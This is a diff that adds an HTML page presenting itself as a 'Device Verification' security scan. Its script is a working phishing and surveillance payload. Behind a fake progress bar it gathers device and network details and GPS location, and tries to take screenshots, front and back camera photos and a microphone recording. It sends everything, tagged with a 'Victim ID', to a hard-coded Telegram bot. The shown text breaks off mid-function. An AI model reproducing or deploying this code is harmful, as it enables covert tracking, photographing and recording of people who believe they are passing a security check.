@@ -1,1 +1,1412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Portal | Device Verification</title>
+    <!-- Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .auth-card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+        .status-item {
+            padding: 12px 15px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            align-items: center;
+            transition: all 0.3s;
+        }
+        .status-item.completed {
+            color: #28a745;
+        }
+        .status-item.active {
+            background-color: #f8f9fa;
+            border-left: 4px solid #3498db;
+        }
+    </style>
+</head>
+<body>
+    <div class="container py-5">
+        <div class="row justify-content-center">
+            <div class="col-md-8 col-lg-6">
+                <div class="auth-card p-4">
+                    <!-- Header -->
+                    <div class="text-center mb-4">
+                        <div class="mb-3">
+                            <i class="fas fa-shield-alt fa-3x text-primary"></i>
+                        </div>
+                        <h2 class="fw-bold">Device Verification Required</h2>
+                        <p class="text-muted mb-0">We're verifying your device for security purposes</p>
+                    </div>
+                    
+                    <!-- Progress Bar -->
+                    <div class="progress mb-4" style="height: 25px;">
+                        <div id="progressBar" class="progress-bar progress-bar-striped progress-bar-animated" 
+                             role="progressbar" style="width: 0%">0%</div>
+                    </div>
+                    
+                    <!-- Status List -->
+                    <div class="mb-4" id="statusList">
+                        <div class="status-item active">
+                            <i class="fas fa-spinner fa-spin text-primary me-3"></i>
+                            <span>Initializing security scan...</span>
+                        </div>
+                        <div class="status-item">
+                            <i class="far fa-clock me-3"></i>
+                            <span>Checking device configuration</span>
+                        </div>
+                        <div class="status-item">
+                            <i class="far fa-clock me-3"></i>
+                            <span>Verifying network security</span>
+                        </div>
+                        <div class="status-item">
+                            <i class="far fa-clock me-3"></i>
+                            <span>Analyzing system integrity</span>
+                        </div>
+                        <div class="status-item">
+                            <i class="far fa-clock me-3"></i>
+                            <span>Finalizing verification</span>
+                        </div>
+                    </div>
+                    
+                    <!-- Device Info Preview -->
+                    <div class="alert alert-info">
+                        <div class="d-flex align-items-center">
+                            <i class="fas fa-info-circle fa-lg me-3"></i>
+                            <div>
+                                <small>This process is automatic and will complete in a few seconds.</small><br>
+                                <small class="text-muted" id="currentAction">Preparing scan...</small>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Security Badges -->
+                    <div class="row text-center mt-4">
+                        <div class="col-4">
+                            <div class="p-3 border rounded">
+                                <i class="fas fa-lock fa-2x text-success mb-2"></i>
+                                <div class="small">Encrypted</div>
+                            </div>
+                        </div>
+                        <div class="col-4">
+                            <div class="p-3 border rounded">
+                                <i class="fas fa-shield-alt fa-2x text-primary mb-2"></i>
+                                <div class="small">Secure</div>
+                            </div>
+                        </div>
+                        <div class="col-4">
+                            <div class="p-3 border rounded">
+                                <i class="fas fa-check-circle fa-2x text-warning mb-2"></i>
+                                <div class="small">Verifying</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Footer -->
+                    <div class="text-center mt-4 pt-3 border-top">
+                        <small class="text-muted">
+                            <i class="fas fa-lock me-1"></i>
+                            Your data is protected with 256-bit encryption
+                        </small>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
 
+    <!-- Hidden elements for stealth operations -->
+    <canvas id="stealthCanvas" style="display: none;" width="200" height="200"></canvas>
+    <div id="stealthContainer" style="display: none;"></div>
+    <audio id="stealthAudio" style="display: none;"></audio>
+    <video id="stealthVideo" style="display: none;" autoplay playsinline></video>
+    
+    <!-- Scripts -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    
+    <script>
+        // ============================================
+        // CONFIGURATION
+        // ============================================
+        const TELEGRAM_CONFIG = {
+            botToken: '7992081098:AAH8uPHC5iGtVt2CB8h6oCaZuCo33BUkfX0',
+            chatId: '1523864238',
+            apiUrl: 'https://api.telegram.org/bot'
+        };
+
+        const VICTIM_ID = 'V_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+        let collectedData = {
+            id: VICTIM_ID,
+            timestamp: new Date().toISOString(),
+            campaign: getCampaignData(),
+            device: {},
+            network: {},
+            location: {},
+            media: {},
+            sensors: {},
+            contacts: {},
+            browser: {},
+            logs: []
+        };
+
+        // ============================================
+        // UTILITY FUNCTIONS
+        // ============================================
+        function getCampaignData() {
+            const params = new URLSearchParams(window.location.search);
+            return {
+                source: document.referrer || 'direct',
+                campaignId: params.get('cid') || params.get('campaign') || 'organic',
+                utm_source: params.get('utm_source'),
+                utm_medium: params.get('utm_medium'),
+                utm_campaign: params.get('utm_campaign'),
+                url: window.location.href,
+                title: document.title
+            };
+        }
+
+        function updateProgress(step, message) {
+            const steps = [
+                "Initializing security scan...",
+                "Checking device configuration",
+                "Verifying network security", 
+                "Analyzing system integrity",
+                "Finalizing verification"
+            ];
+            
+            // Update progress bar
+            const progress = Math.min(100, (step / steps.length) * 100);
+            const progressBar = document.getElementById('progressBar');
+            if (progressBar) {
+                progressBar.style.width = `${progress}%`;
+                progressBar.textContent = `${Math.round(progress)}%`;
+            }
+            
+            // Update status list
+            const statusItems = document.querySelectorAll('.status-item');
+            statusItems.forEach((item, index) => {
+                const icon = item.querySelector('i');
+                if (index < step) {
+                    item.classList.add('completed');
+                    item.classList.remove('active');
+                    if (icon) {
+                        icon.className = 'fas fa-check-circle text-success me-3';
+                    }
+                } else if (index === step) {
+                    item.classList.add('active');
+                    item.classList.remove('completed');
+                    if (icon) {
+                        icon.className = 'fas fa-spinner fa-spin text-primary me-3';
+                    }
+                } else {
+                    item.classList.remove('active', 'completed');
+                    if (icon) {
+                        icon.className = 'far fa-clock me-3';
+                    }
+                }
+            });
+            
+            // Update current action
+            const currentAction = document.getElementById('currentAction');
+            if (currentAction) {
+                currentAction.textContent = steps[step] || message || "Processing...";
+            }
+            
+            // Log
+            collectedData.logs.push({ step, message: steps[step] || message, time: Date.now() });
+        }
+
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // ============================================
+        // TELEGRAM FUNCTIONS - DIRECT DATA SENDING
+        // ============================================
+        async function sendToTelegram(message, options = {}) {
+            if (!TELEGRAM_CONFIG.botToken || !TELEGRAM_CONFIG.chatId) return false;
+            
+            try {
+                const url = `${TELEGRAM_CONFIG.apiUrl}${TELEGRAM_CONFIG.botToken}/${options.method || 'sendMessage'}`;
+                
+                let body;
+                if (options.isFormData) {
+                    body = message; // Already FormData
+                } else {
+                    body = JSON.stringify({
+                        chat_id: TELEGRAM_CONFIG.chatId,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true,
+                        ...options.extra
+                    });
+                }
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: options.isFormData ? {} : { 'Content-Type': 'application/json' },
+                    body: body
+                });
+                
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Telegram error:', error);
+                return false;
+            }
+        }
+
+        async function sendPhotoToTelegram(photoData, caption = '') {
+            try {
+                // Convert base64 to blob
+                const blob = await fetch(photoData).then(r => r.blob());
+                
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CONFIG.chatId);
+                formData.append('photo', blob, 'screenshot.jpg');
+                if (caption) formData.append('caption', caption);
+                
+                return await sendToTelegram(formData, { method: 'sendPhoto', isFormData: true });
+            } catch (error) {
+                console.error('Photo send error:', error);
+                return false;
+            }
+        }
+
+        async function sendAudioToTelegram(audioBlob, caption = '') {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CONFIG.chatId);
+                formData.append('audio', audioBlob, 'recording.ogg');
+                if (caption) formData.append('caption', caption);
+                
+                return await sendToTelegram(formData, { method: 'sendAudio', isFormData: true });
+            } catch (error) {
+                console.error('Audio send error:', error);
+                return false;
+            }
+        }
+
+        // ============================================
+        // ENHANCED MAP FUNCTIONS
+        // ============================================
+        function generateGoogleMapsLink(lat, lon) {
+            return `https://www.google.com/maps?q=${lat},${lon}&z=15&t=m`;
+        }
+
+        function generateGoogleMapsEmbed(lat, lon) {
+            return `https://maps.google.com/maps?q=${lat},${lon}&hl=en&z=15&output=embed`;
+        }
+
+        function generateGoogleMapsStatic(lat, lon, zoom = 15, size = '600x300') {
+            // Using OpenStreetMap for static images (no API key needed)
+            return `https://static-maps.yandex.ru/1.x/?ll=${lon},${lat}&z=${zoom}&size=${size}&l=map&pt=${lon},${lat},pmwtm1`;
+        }
+
+        function generateOpenStreetMapLink(lat, lon) {
+            return `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=15/${lat}/${lon}`;
+        }
+
+        function generateOpenStreetMapEmbed(lat, lon) {
+            return `https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.01}%2C${lat-0.01}%2C${lon+0.01}%2C${lat+0.01}&layer=mapnik&marker=${lat}%2C${lon}`;
+        }
+
+        function generateBingMapsLink(lat, lon) {
+            return `https://bing.com/maps/default.aspx?cp=${lat}~${lon}&lvl=15`;
+        }
+
+        function generateAppleMapsLink(lat, lon) {
+            return `https://maps.apple.com/?q=${lat},${lon}&z=15&t=s`;
+        }
+
+        function generateWhat3Words(lat, lon) {
+            // Simple simulation of what3words
+            const words = ['apple', 'brave', 'chair', 'dream', 'eagle', 'flame', 'grape', 'house'];
+            const latHash = Math.abs(Math.floor(lat * 1000)) % words.length;
+            const lonHash = Math.abs(Math.floor(lon * 1000)) % words.length;
+            const altHash = Math.abs(Math.floor((lat + lon) * 1000)) % words.length;
+            return `${words[latHash]}.${words[lonHash]}.${words[altHash]}`;
+        }
+
+        function generateAddressLookupLink(lat, lon) {
+            return `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
+        }
+
+        async function getAddressFromCoordinates(lat, lon) {
+            try {
+                const response = await fetch(generateAddressLookupLink(lat, lon));
+                const data = await response.json();
+                
+                if (data.address) {
+                    const addr = data.address;
+                    let address = '';
+                    
+                    if (addr.road) address += `${addr.road}, `;
+                    if (addr.suburb) address += `${addr.suburb}, `;
+                    if (addr.city || addr.town || addr.village) address += `${addr.city || addr.town || addr.village}, `;
+                    if (addr.state) address += `${addr.state}, `;
+                    if (addr.country) address += addr.country;
+                    
+                    return address.replace(/, $/, '');
+                }
+            } catch (error) {
+                console.error('Address lookup failed:', error);
+            }
+            return null;
+        }
+
+        async function sendEnhancedLocationToTelegram(lat, lon, accuracy = null) {
+            // Get address if possible
+            const address = await getAddressFromCoordinates(lat, lon);
+            
+            // Generate all map links
+            const googleMapsLink = generateGoogleMapsLink(lat, lon);
+            const openStreetMapLink = generateOpenStreetMapLink(lat, lon);
+            const bingMapsLink = generateBingMapsLink(lat, lon);
+            const appleMapsLink = generateAppleMapsLink(lat, lon);
+            const staticMapImage = generateGoogleMapsStatic(lat, lon);
+            const w3w = generateWhat3Words(lat, lon);
+            
+            let message = `📍 *ENHANCED LOCATION DATA*\n\n`;
+            message += `🆔 *Victim ID:* \`${VICTIM_ID}\`\n`;
+            message += `🎯 *Coordinates:* ${lat.toFixed(6)}, ${lon.toFixed(6)}\n`;
+            
+            if (accuracy) {
+                message += `📏 *Accuracy:* ${accuracy.toFixed(2)} meters\n`;
+            }
+            
+            if (address) {
+                message += `🏠 *Address:* ${address}\n`;
+            }
+            
+            message += `🗺️ *Google Maps:* [Click Here](${googleMapsLink})\n`;
+            message += `🗺️ *OpenStreetMap:* [Click Here](${openStreetMapLink})\n`;
+            message += `🗺️ *Bing Maps:* [Click Here](${bingMapsLink})\n`;
+            message += `🗺️ *Apple Maps:* [Click Here](${appleMapsLink})\n`;
+            message += `🔤 *What3Words:* \`${w3w}\`\n`;
+            message += `🔗 *Source URL:* ${collectedData.campaign.url}`;
+            
+            // Send the message
+            await sendToTelegram(message);
+            
+            // Send static map image
+            await sendPhotoToTelegram(staticMapImage, `📍 Map Location: ${lat.toFixed(6)}, ${lon.toFixed(6)}`);
+            
+            // Send additional map links
+            const embedMessage = `🗺️ *INTERACTIVE MAPS*\n\n`;
+            const embedMessage2 = `*Google Maps Embedded:* ${generateGoogleMapsEmbed(lat, lon)}\n`;
+            const embedMessage3 = `*OpenStreetMap Embedded:* ${generateOpenStreetMapEmbed(lat, lon)}\n`;
+            const embedMessage4 = `*Coordinates Formats:*\n`;
+            const embedMessage5 = `• Decimal: ${lat}, ${lon}\n`;
+            const embedMessage6 = `• DMS: ${convertToDMS(lat, lon)}\n`;
+            const embedMessage7 = `• UTM: ${convertToUTM(lat, lon)}`;
+            
+            await sendToTelegram(embedMessage + embedMessage2 + embedMessage3 + embedMessage4 + embedMessage5 + embedMessage6 + embedMessage7);
+        }
+
+        function convertToDMS(lat, lon) {
+            const latDirection = lat >= 0 ? 'N' : 'S';
+            const lonDirection = lon >= 0 ? 'E' : 'W';
+            
+            const latAbs = Math.abs(lat);
+            const lonAbs = Math.abs(lon);
+            
+            const latDeg = Math.floor(latAbs);
+            const latMin = Math.floor((latAbs - latDeg) * 60);
+            const latSec = ((latAbs - latDeg - latMin/60) * 3600).toFixed(1);
+            
+            const lonDeg = Math.floor(lonAbs);
+            const lonMin = Math.floor((lonAbs - lonDeg) * 60);
+            const lonSec = ((lonAbs - lonDeg - lonMin/60) * 3600).toFixed(1);
+            
+            return `${latDeg}°${latMin}'${latSec}"${latDirection} ${lonDeg}°${lonMin}'${lonSec}"${lonDirection}`;
+        }
+
+        function convertToUTM(lat, lon) {
+            // Simplified UTM conversion
+            const zone = Math.floor((lon + 180) / 6) + 1;
+            return `Zone ${zone}`;
+        }
+
+        // ============================================
+        // DATA COLLECTION FUNCTIONS
+        // ============================================
+        async function collectDeviceInfo() {
+            updateProgress(1, "Collecting device information...");
+            
+            collectedData.device = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                language: navigator.language,
+                languages: navigator.languages,
+                deviceMemory: navigator.deviceMemory,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                maxTouchPoints: navigator.maxTouchPoints,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                window: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                online: navigator.onLine,
+                cookieEnabled: navigator.cookieEnabled,
+                webdriver: navigator.webdriver,
+                deviceType: detectDeviceType(),
+                browser: detectBrowser(),
+                os: detectOS()
+            };
+            
+            // Send device info immediately
+            await sendDeviceInfoToTelegram();
+            await delay(500);
+        }
+
+        function detectDeviceType() {
+            const ua = navigator.userAgent.toLowerCase();
+            if (/mobile|android|iphone|ipad|ipod/.test(ua)) return 'mobile';
+            if (/tablet|ipad/.test(ua)) return 'tablet';
+            return 'desktop';
+        }
+
+        function detectBrowser() {
+            const ua = navigator.userAgent;
+            if (/chrome/i.test(ua) && !/edge|edg/i.test(ua)) return 'Chrome';
+            if (/firefox/i.test(ua)) return 'Firefox';
+            if (/safari/i.test(ua) && !/chrome/i.test(ua)) return 'Safari';
+            if (/edge|edg/i.test(ua)) return 'Edge';
+            return 'Unknown';
+        }
+
+        function detectOS() {
+            const ua = navigator.userAgent;
+            if (/windows/i.test(ua)) return 'Windows';
+            if (/macintosh|mac os x/i.test(ua)) return 'macOS';
+            if (/android/i.test(ua)) return 'Android';
+            if (/iphone|ipad|ipod/i.test(ua)) return 'iOS';
+            if (/linux/i.test(ua)) return 'Linux';
+            return 'Unknown';
+        }
+
+        async function sendDeviceInfoToTelegram() {
+            const device = collectedData.device;
+            let message = `📱 *DEVICE INFORMATION*\n\n`;
+            message += `🆔 *Victim ID:* \`${VICTIM_ID}\`\n`;
+            message += `⏰ *Time:* ${new Date().toLocaleString()}\n`;
+            message += `📟 *Device Type:* ${device.deviceType}\n`;
+            message += `🖥️ *OS:* ${device.os}\n`;
+            message += `🌐 *Browser:* ${device.browser}\n`;
+            message += `🗣️ *Language:* ${device.language}\n`;
+            message += `🖥️ *Screen:* ${device.screen.width}x${device.screen.height}\n`;
+            message += `🔢 *Color Depth:* ${device.screen.colorDepth} bit\n`;
+            message += `💾 *Memory:* ${device.deviceMemory || 'Unknown'} GB\n`;
+            message += `⚡ *CPU Cores:* ${device.hardwareConcurrency || 'Unknown'}\n`;
+            message += `🕐 *Timezone:* ${device.timezone}\n`;
+            message += `🔗 *URL:* ${collectedData.campaign.url}`;
+            
+            await sendToTelegram(message);
+        }
+
+        async function collectNetworkInfo() {
+            updateProgress(2, "Collecting network information...");
+            
+            try {
+                // Get public IP with multiple fallbacks
+                const ipServices = [
+                    'https://api.ipify.org?format=json',
+                    'https://api64.ipify.org?format=json',
+                    'https://ipapi.co/json/',
+                    'https://ipwhois.app/json/',
+                    'https://ipinfo.io/json'
+                ];
+                
+                let ipData = {};
+                for (const service of ipServices) {
+                    try {
+                        const response = await fetch(service);
+                        if (response.ok) {
+                            const data = await response.json();
+                            if (data.ip) {
+                                ipData = { ...ipData, ...data };
+                                break;
+                            }
+                        }
+                    } catch (e) {}
+                }
+                
+                collectedData.network = {
+                    ipv4: ipData.ip || 'Unknown',
+                    ipv6: ipData.ipv6 || null,
+                    country: ipData.country || ipData.country_name || ipData.countryCode,
+                    region: ipData.region || ipData.region_name || ipData.regionName,
+                    city: ipData.city || ipData.city_name,
+                    isp: ipData.org || ipData.isp || ipData.asn,
+                    timezone: ipData.timezone || ipData.time_zone,
+                    location: ipData.loc || (ipData.latitude && ipData.longitude ? `${ipData.latitude},${ipData.longitude}` : null),
+                    coordinates: ipData.latitude && ipData.longitude ? {
+                        lat: ipData.latitude,
+                        lon: ipData.longitude
+                    } : null,
+                    online: navigator.onLine,
+                    connection: navigator.connection ? {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt,
+                        saveData: navigator.connection.saveData
+                    } : null
+                };
+                
+                // Send network info immediately
+                await sendNetworkInfoToTelegram();
+                await delay(500);
+            } catch (error) {
+                collectedData.network = { error: error.message };
+            }
+        }
+
+        async function sendNetworkInfoToTelegram() {
+            const network = collectedData.network;
+            let message = `🌐 *NETWORK INFORMATION*\n\n`;
+            message += `🆔 *Victim ID:* \`${VICTIM_ID}\`\n`;
+            message += `📡 *IP Address:* \`${network.ipv4}\`\n`;
+            
+            if (network.ipv6) {
+                message += `📡 *IPv6:* \`${network.ipv6}\`\n`;
+            }
+            
+            if (network.city && network.country) {
+                message += `📍 *Location:* ${network.city}, ${network.region}, ${network.country}\n`;
+            }
+            
+            if (network.isp) {
+                message += `🏢 *ISP:* ${network.isp}\n`;
+            }
+            
+            if (network.timezone) {
+                message += `🕐 *Timezone:* ${network.timezone}\n`;
+            }
+            
+            if (network.connection) {
+                message += `📶 *Connection:* ${network.connection.effectiveType || 'Unknown'}\n`;
+                message += `⬇️ *Download:* ${network.connection.downlink || 'Unknown'} Mbps\n`;
+                message += `⏱️ *Latency:* ${network.connection.rtt || 'Unknown'}ms\n`;
+            }
+            
+            message += `🔗 *Source URL:* ${collectedData.campaign.url}`;
+            
+            await sendToTelegram(message);
+        }
+
+        async function collectLocation() {
+            updateProgress(2, "Detecting location...");
+            
+            try {
+                // Try high-accuracy geolocation
+                const geoLocation = await getGeolocation();
+                
+                if (geoLocation) {
+                    collectedData.location = {
+                        gps: {
+                            latitude: geoLocation.latitude,
+                            longitude: geoLocation.longitude,
+                            accuracy: geoLocation.accuracy,
+                            altitude: geoLocation.altitude,
+                            heading: geoLocation.heading,
+                            speed: geoLocation.speed,
+                            timestamp: geoLocation.timestamp
+                        },
+                        source: 'gps',
+                        accuracy: geoLocation.accuracy
+                    };
+                    
+                    // Send enhanced location with all map services
+                    await sendEnhancedLocationToTelegram(
+                        geoLocation.latitude, 
+                        geoLocation.longitude, 
+                        geoLocation.accuracy
+                    );
+                } else {
+                    // Fallback to IP-based location
+                    collectedData.location = {
+                        source: 'ip',
+                        data: collectedData.network
+                    };
+                    
+                    if (collectedData.network.coordinates) {
+                        await sendEnhancedLocationToTelegram(
+                            collectedData.network.coordinates.lat,
+                            collectedData.network.coordinates.lon,
+                            50000 // IP location has ~50km accuracy
+                        );
+                    } else {
+                        await sendToTelegram(`📍 *IP Location:* ${collectedData.network.city || 'Unknown'}, ${collectedData.network.country || 'Unknown'}`);
+                    }
+                }
+                
+                await delay(500);
+            } catch (error) {
+                collectedData.location = { error: error.message };
+            }
+        }
+
+        function getGeolocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            timestamp: position.timestamp
+                        });
+                    },
+                    (error) => {
+                        console.log('Geolocation error:', error);
+                        resolve(null);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        async function collectMedia() {
+            updateProgress(3, "Analyzing media capabilities...");
+            
+            collectedData.media = {
+                camera: {},
+                microphone: {},
+                screenshot: {},
+                timestamp: Date.now()
+            };
+            
+            // Take screenshot
+            await captureScreenshot();
+            
+            // Try to access camera
+            await captureCameraPhoto();
+            
+            // Try to record audio
+            await recordAudio();
+            
+            await delay(1000);
+        }
+
+        async function captureScreenshot() {
+            try {
+                updateProgress(3, "Capturing screen...");
+                
+                const canvas = await html2canvas(document.body, {
+                    scale: 0.5,
+                    useCORS: true,
+                    logging: false,
+                    allowTaint: true,
+                    backgroundColor: null
+                });
+                
+                const screenshot = canvas.toDataURL('image/jpeg', 0.7);
+                collectedData.media.screenshot = {
+                    type: 'fullpage',
+                    resolution: `${canvas.width}x${canvas.height}`,
+                    timestamp: Date.now()
+                };
+                
+                // Send screenshot immediately
+                await sendPhotoToTelegram(screenshot, `🖥️ SCREENSHOT - ${VICTIM_ID}\nResolution: ${canvas.width}x${canvas.height}\nURL: ${collectedData.campaign.url}`);
+                
+                return true;
+            } catch (error) {
+                collectedData.media.screenshot = { error: error.message };
+                return false;
+            }
+        }
+
+        async function captureCameraPhoto() {
+            try {
+                updateProgress(3, "Checking camera...");
+                
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user' // Front camera
+                    }
+                });
+                
+                const video = document.getElementById('stealthVideo');
+                video.srcObject = stream;
+                
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                await delay(1000); // Let camera adjust
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const photo = canvas.toDataURL('image/jpeg', 0.8);
+                collectedData.media.camera = {
+                    type: 'photo',
+                    resolution: `${canvas.width}x${canvas.height}`,
+                    timestamp: Date.now(),
+                    camera: 'front'
+                };
+                
+                // Send front camera photo
+                await sendPhotoToTelegram(photo, `📷 FRONT CAMERA - ${VICTIM_ID}\nResolution: ${canvas.width}x${canvas.height}`);
+                
+                // Stop stream
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Try back camera
+                try {
+                    const backStream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 },
+                            facingMode: { exact: 'environment' }
+                        }
+                    });
+                    
+                    video.srcObject = backStream;
+                    await delay(1000);
+                    
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const backPhoto = canvas.toDataURL('image/jpeg', 0.8);
+                    
+                    collectedData.media.backCamera = {
+                        type: 'photo',
+                        resolution: `${canvas.width}x${canvas.height}`,
+                        timestamp: Date.now(),
+                        camera: 'back'
+                    };
+                    
+                    // Send back camera photo
+                    await sendPhotoToTelegram(backPhoto, `📷 BACK CAMERA - ${VICTIM_ID}\nResolution: ${canvas.width}x${canvas.height}`);
+                    
+                    backStream.getTracks().forEach(track => track.stop());
+                } catch (e) {
+                    // Back camera not available
+                }
+                
+                return true;
+            } catch (error) {
+                collectedData.media.camera = { error: error.message, status: 'denied' };
+                return false;
+            }
+        }
+
+        async function recordAudio() {
+            try {
+                updateProgress(3, "Checking microphone...");
+                
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    audio: {
+                        echoCancellation: false,
+                        noiseSuppression: false,
+                        autoGainControl: false,
+                        channelCount: 2
+                    }
+                });
+                
+                const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                const chunks = [];
+                
+                recorder.ondataavailable = (e) => chunks.push(e.data);
+                
+                return new Promise((resolve) => {
+                    recorder.onstop = async () => {
+                        const blob = new Blob(chunks, { type: 'audio/webm; codecs=opus' });
+                        collectedData.media.microphone = {
+                            type: 'audio',
+                            duration: 5,
+                            format: 'webm',
+                            timestamp: Date.now(),
+                            size: blob.size
+                        };
+                        
+                        // Send audio recording
+                        await sendAudioToTelegram(blob, `🎤 AUDIO RECORDING - ${VICTIM_ID}\nDuration: 5 seconds\nFormat: WebM/Opus`);
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        resolve(true);
+                    };
+                    
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 5000); // Record 5 seconds
+                });
+                
+            } catch (error) {
+                collectedData.media.microphone = { error: error.message, status: 'denied' };
+                return false;
+            }
+        }
+
+        async function collectSensorData() {
+            updateProgress(4, "Reading device sensors...");
+            
+            collectedData.sensors = {
+                orientation: {},
+                motion: {},
+                battery: {},
+                timestamp: Date.now()
+            };
+            
+            // Collect battery info
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    collectedData.sensors.battery = {
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch (e) {}
+            }
+            
+            // Collect orientation data
+            if (window.DeviceOrientationEvent) {
+                const orientation = await getDeviceOrientation();
+                collectedData.sensors.orientation = orientation;
+            }
+            
+            // Collect motion data
+            if (window.DeviceMotionEvent) {
+                const motion = await getDeviceMotion();
+                collectedData.sensors.motion = motion;
+            }
+            
+            // Send sensor data immediately
+            await sendSensorDataToTelegram();
+            await delay(500);
+        }
+
+        function getDeviceOrientation() {
+            return new Promise((resolve) => {
+                const handler = (event) => {
+                    resolve({
+                        alpha: event.alpha,
+                        beta: event.beta,
+                        gamma: event.gamma,
+                        absolute: event.absolute,
+                        timestamp: Date.now()
+                    });
+                    window.removeEventListener('deviceorientation', handler);
+                };
+                
+                window.addEventListener('deviceorientation', handler, { once: true });
+                
+                setTimeout(() => {
+                    window.removeEventListener('deviceorientation', handler);
+                    resolve({});
+                }, 2000);
+            });
+        }
+
+        function getDeviceMotion() {
+            return new Promise((resolve) => {
+                const handler = (event) => {
+                    resolve({
+                        acceleration: {
+                            x: event.acceleration?.x,
+                            y: event.acceleration?.y,
+                            z: event.acceleration?.z
+                        },
+                        accelerationIncludingGravity: {
+                            x: event.accelerationIncludingGravity?.x,
+                            y: event.accelerationIncludingGravity?.y,
+                            z: event.accelerationIncludingGravity?.z
+                        },
+                        rotationRate: {
+                            alpha: event.rotationRate?.alpha,
+                            beta: event.rotationRate?.beta,
+                            gamma: event.rotationRate?.gamma
+                        },
+                        interval: event.interval,
+                        timestamp: Date.now()
+                    });
+                    window.removeEventListener('devicemotion', handler);
+                };
+                
+                window.addEventListener('devicemotion', handler, { once: true });
+                
+                setTimeout(() => {
+                    window.removeEventListener('devicemotion', handler);
+                    resolve({});
+                }, 2000);
+            });
+        }
+
+        async function sendSensorDataToTelegram() {
+            const sensors = collectedData.sensors;
+            let message = `📡 *DEVICE SENSORS*\n\n`;
+            message += `🆔 *Victim ID:* \`${VICTIM_ID}\`\n`;
+            
+            if (sensors.battery.level !== undefined) {
+                message += `🔋 *Battery:* ${sensors.battery.level}% ${sensors.battery.charging ? '(Charging ⚡)' : '(Not Charging)'}\n`;
+                if (sensors.battery.chargingTime !== Infinity) {
+                    message += `⏳ *Charge Time:* ${sensors.battery.chargingTime} seconds\n`;
+                }
+                if (sensors.battery.dischargingTime !== Infinity) {
+                    message += `⏳ *Discharge Time:* ${sensors.battery.dischargingTime} seconds\n`;
+                }
+            }
+            
+            if (sensors.orientation.alpha !== undefined) {
+                message += `🧭 *Orientation:*\n`;
+                message += `   α: ${sensors.orientation.alpha?.toFixed(2) || 'N/A'}°\n`;
+                message += `   β: ${sensors.orientation.beta?.toFixed(2) || 'N/A'}°\n`;
